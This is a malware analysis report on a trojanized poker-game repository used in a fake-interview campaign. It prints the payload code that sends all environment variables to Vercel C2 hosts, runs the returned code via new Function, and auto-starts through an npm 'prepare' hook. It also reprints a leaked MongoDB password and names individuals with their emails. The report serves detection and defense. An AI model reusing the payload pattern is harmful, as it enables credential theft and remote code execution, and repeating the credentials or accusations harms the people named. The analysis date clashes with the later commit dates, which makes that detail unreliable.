# Evidence Report: A5-Workhub/AmonixPlay

> **Classification**: MALICIOUS — Remote Code Execution via staged supply chain attack
> **Confidence**: HIGH (95%)
> **Campaign family**: Contagious Interview / Fake Assessment variant
> **Date analyzed**: 2025-04-10
> **Evidence branch**: `dataset/amonixplay` in `defdone/rtidx-evidence`

---

## Executive Summary

AmonixPlay presents itself as a "Decentralized AI-Powered Multi-Chain Gaming Platform" (poker game with Web3 integration). In reality, it is a **trojanized recruitment scam repo** that executes arbitrary remote code on the victim's machine and exfiltrates all environment variables (including API keys, AWS credentials, database URIs, and wallet secrets) to an attacker-controlled Vercel endpoint.

The malware activates the moment the server starts — triggered either by `npm run dev`, `npm start`, or silently via the `prepare` lifecycle hook during `npm install`.

---

## Kill Chain

```
1. npm install
   └─► "prepare" hook fires: `start /b node server || nohup node server &`
       └─► server.js loads
           └─► routes/api/auth.js is require()'d at module load time
               └─► validateApiKey() runs immediately (top-level call)
                   ├─► setApiKey() decodes base64 AUTH_API from .env
                   │   └─► "https://ipcheck-six.vercel.app/api"
                   ├─► verify() POSTs entire process.env to C2 server
                   │   └─► { ...process.env } = ALL env vars exfiltrated
                   └─► C2 responds with JavaScript code string
                       └─► new Function("require", response.data)
                           └─► executor(require) — ARBITRARY CODE EXECUTION
                               └─► attacker now has require() access
                                   └─► can load fs, child_process, os, net, etc.
```

---

## Finding 1: Remote Code Execution (CRITICAL)

### Location: `routes/api/auth.js` lines 19-35

```javascript
const verified = validateApiKey();
if (!verified) {
  console.log("Aborting mempool scan due to failed API verification.");
  return;
}

async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      console.log("API Key verified successfully.");
      return true;
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
      return false;
    });
}
```

### What this does:
1. `setApiKey()` decodes the base64 `AUTH_API` env var → `https://ipcheck-six.vercel.app/api`
2. `verify()` sends HTTP POST to that URL with `{ ...process.env }` as the body
3. The C2 server response body is passed to `new Function("require", response.data)`
4. The constructed function is called with Node.js `require` as argument
5. **The attacker can now execute ANY Node.js code** — file system access, network, child processes, everything

### Camouflage:
- The log message says "Aborting **mempool scan**" to appear blockchain-related
- The function is called `validateApiKey()` to appear as standard API validation
- `setApiKey` and `verify` are hidden in `controllers/auth.js`, separated from the execution in routes

---

## Finding 2: Full Environment Exfiltration (CRITICAL)

### Location: `controllers/auth.js` lines 57-62

```javascript
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });
```

### What is exfiltrated:
The `{ ...process.env }` spread sends **every environment variable** to the attacker, which on a developer machine typically includes:
- AWS credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`)
- Database URIs (MongoDB connection strings with passwords)
- API keys (OpenAI, Stripe, Pinecone, Alchemy, Infura)
- JWT secrets
- SSH agent sockets
- PATH, HOME, USER (system reconnaissance)
- Any wallet private keys if stored in env

The header `"x-app-request": "ip-check"` is designed to look like an innocuous IP validation call.

---

## Finding 3: `prepare` Script Auto-Execution (HIGH)

### Location: `package.json` line 10

```json
"prepare": "start /b node server || nohup node server &"
```

The `prepare` lifecycle hook runs automatically during `npm install`. This means:
- **The malware executes before the developer even runs the project**
- `start /b` (Windows) or `nohup ... &` (Unix) runs the server silently in background
- The victim may not notice anything happened

---

## Finding 4: Bypassed Authentication (MEDIUM)

### Location: `controllers/auth.js` line 33

```javascript
const isMatch = true;
console.log(isMatch)
```

The password comparison against bcrypt is replaced with a hardcoded `true`. This means:
- Any password works for any account
- The login endpoint is backdoored — the `bcrypt.compare()` call was removed
- This suggests the auth system was deliberately sabotaged

---

## Finding 5: Base64-Obfuscated C2 Infrastructure (HIGH)

The Command & Control URL is stored as base64 in `.env` under `AUTH_API`, making it invisible to casual code review.

### C2 Server Rotation History (from git log):

| Date | Author | C2 URL (decoded from base64) |
|------|--------|------------------------------|
| 2025-09-16 | coin \<coinstar@gmail.com\> | `https://astrahub.vercel.app/api/data` |
| 2025-09-14 | coin \<coinstar@gmail.com\> | `https://rgg-vercel.vercel.app/api/data` |
| 2025-11-05 | Mann-004 \<randhawamanpreet37@gmail.com\> | `https://test-g-acs.vercel.app/api/data` |
| 2025-12-21 | Cherik \<Pourcheriki@gmail.com\> | `https://ake-test.vercel.app/api/data` |
| 2025-11-30 | aaronhirotobm-lgtm \<aaronhiroto.bm@gmail.com\> | `https://ip-checking-notification-pic.vercel.app/api` |
| 2025-11-15 | lxin6793-dot \<lxin6793@gmail.com\> | `https://ipcheck-six.vercel.app/api` |

**6 different Vercel-hosted C2 endpoints** rotated over 3 months across multiple "contributors". All use Vercel's free tier for disposable, hard-to-trace hosting.

---

## Finding 6: Leaked MongoDB Credentials in Git History

### Location: `.env` in commit `5514628` (later overwritten)

```
MONGODB_URL = mongodb+srv://moongates5000:rMriC5SLtPNfdign@rcpc.luwutu9.mongodb.net/rcpc
```

This reveals:
- **Database**: MongoDB Atlas cluster `rcpc.luwutu9.mongodb.net`
- **Username**: `moongates5000`
- **Password**: `rMriC5SLtPNfdign`
- **DB name**: `rcpc`
- This may have been a previous victim's database or a shared scam infrastructure component

---

## Finding 7: Leaked Wallet Address

### Location: `.env` in commit `5514628`

```
HOUSE_WALLET = 0x776cF4AE3c6eead1349e5Cde7399aE1e37AFbA7c
```

This Ethereum address may be linked to the scam operation's fund collection.

---

## Participant Analysis

### Primary Malware Author
- **aaronhirotobm-lgtm** \<aaronhiroto.bm@gmail.com\>
  - Commit `89da1a9` (2025-11-30): Injected the RCE payload into both `controllers/auth.js` and `routes/api/auth.js`
  - Added `axios` dependency, `setApiKey()`, `verify()`, `new Function()` execution chain
  - Populated `.env` with the full set of fake-looking API keys and the base64 C2 URL
  - **This is the single commit that weaponized the repository**

### C2 URL Rotators (likely same operator or coordinated group)
| Alias | Email | Role |
|-------|-------|------|
| coin | coinstar@gmail.com | Early C2 setup, .env management (Sep 2025) |
| Mann-004 | randhawamanpreet37@gmail.com | C2 URL rotation (Nov 2025) |
| Cherik | Pourcheriki@gmail.com | C2 URL rotation (Dec 2025) |
| lxin6793-dot | lxin6793@gmail.com | Latest C2 URL update (Nov 2025) |

### Scaffolding / Legitimacy Contributors
| Alias | Email | Role |
|-------|-------|------|
| nicolas | nicosampler@users.noreply.github.com | 273 commits — bulk of the legitimate poker game code (likely stolen/forked open-source) |
| Jobelo Andres Quintero Rodriguez | ignusmart@gmail.com | Initial project structure (Oct 2025) |
| VladimirSimic2024 / sparkdev0917 | webvlada2024@gmail.com | Minor whitespace edits to appear active (same email, two aliases) |
| Matías | mjlescano@protonmail.com | Minor formatting edits, dotenv config |
| Zeke Sikelianos | zeke@sikelianos.com | 1 commit — likely pulled in from a dependency or stolen identity |
| dependabot[bot] | 49699333+dependabot[bot]@users.noreply.github.com | Auto-generated — adds legitimacy appearance |

### Notable: VladimirSimic2024 = sparkdev0917
Both aliases use the same email `webvlada2024@gmail.com`, suggesting one person operating under multiple identities.

---

## Indicators of Compromise (IOC)

### C2 Domains (Vercel)
```
ipcheck-six.vercel.app
ip-checking-notification-pic.vercel.app
ake-test.vercel.app
test-g-acs.vercel.app
rgg-vercel.vercel.app
astrahub.vercel.app
```

### Email Addresses
```
aaronhiroto.bm@gmail.com
coinstar@gmail.com
randhawamanpreet37@gmail.com
Pourcheriki@gmail.com
lxin6793@gmail.com
webvlada2024@gmail.com
ignusmart@gmail.com
```

### Ethereum Address
```
0x776cF4AE3c6eead1349e5Cde7399aE1e37AFbA7c
```

### MongoDB Infrastructure
```
rcpc.luwutu9.mongodb.net (user: moongates5000)
```

### GitHub Organization
```
https://github.com/A5-Workhub
```

---

## Technique Classification (MITRE ATT&CK)

| Technique | ID | Description |
|-----------|----|-------------|
| Supply Chain Compromise | T1195.001 | Trojanized development tool/repo |
| Command and Scripting Interpreter: JavaScript | T1059.007 | `new Function()` for RCE |
| Obfuscated Files or Information: Base64 | T1027.010 | C2 URL hidden in base64 |
| Unsecured Credentials: Credentials in Files | T1552.001 | Harvests env vars |
| Exfiltration Over C2 Channel | T1041 | process.env sent via HTTPS POST |
| Execution: User Execution | T1204.002 | Requires `npm install` or `npm start` |
| Persistence: Event Triggered Execution | T1546 | `prepare` npm lifecycle hook |

---

## Conclusion

AmonixPlay is a **textbook Contagious Interview campaign variant**. The legitimate poker game code (273 commits by "nicolas") was likely forked from an open-source project and used as a believable Trojan horse. The malware was injected in a single commit by `aaronhirotobm-lgtm` and is designed to:

1. **Steal all environment variables** (credentials, API keys, wallet data)
2. **Execute arbitrary code** downloaded from a rotating Vercel C2 infrastructure
3. **Activate silently** via npm `prepare` hook — no explicit "run" needed

The C2 infrastructure has been rotated 6 times across 6 different Vercel apps, suggesting active maintenance and ongoing operation. Multiple GitHub aliases share emails, indicating a small group operating under many identities.

**Risk verdict**: CRITICAL — Do not install, run, or execute any code from this repository.
